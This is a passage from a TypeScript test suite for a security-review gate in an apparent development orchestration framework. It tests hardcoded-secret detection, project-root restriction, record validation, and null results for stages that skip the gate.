    expect(record.projectRoot).toBe(worktree);
    expect(checkNamed(record, "hardcoded_secret")).toMatchObject({ paths: ["src/config.ts"] });
    expect(record.status).toBe("fail");

    // The resolver decides, so a request for any other tree — the checkout included — is still
    // refused even though the provider's own `projectRoot` names one of them.
    await expect(provider.review({ ...request, projectRoot: project })).rejects.toThrow();
  });

  it("produces a record the framework accepts", async () => {
    const record = await scan({ "src/index.ts": "export const answer = 42;\n" });
    const request: SecurityReviewRequest = {
      featureId: "F-001",
      stage: "security_review",
      revision: 1,
      projectRoot: record.projectRoot,
      workspaceId: record.workspaceId,
      changes: {
        added: ["src/index.ts"],
        deleted: [],
        modified: [],
        renamed: [],
        untracked: [],
      },
      changedPaths: ["src/index.ts"],
      approvedPatterns: ["**"],
      protectedPatterns: SECURITY_PROTECTED_PATTERNS,
      workspaceFingerprint: "0".repeat(64),
      previousReview: null,
    };

    expect(validateSecurityReviewEvidence(record)).toMatchObject({ ok: true });
    expect(bindSecurityReviewToRequest(record, request)).toMatchObject({ ok: true });
  });
});

describe("a stage that never ran the gate", () => {
  it("reports no security record rather than an empty one", async () => {
    const root = await makeRoot();
    const harness = makeHarness(root, passingProvider());
    await driveToPlanGate(harness);

    const results: OrchestrationResult[] = [];

    for (let step = 0; step < 4; step += 1) {
      results.push(await harness.orchestrator.runNext("F-001"));
    }

    expect(results.every((result) => result.security === null)).toBe(true);
  });
});
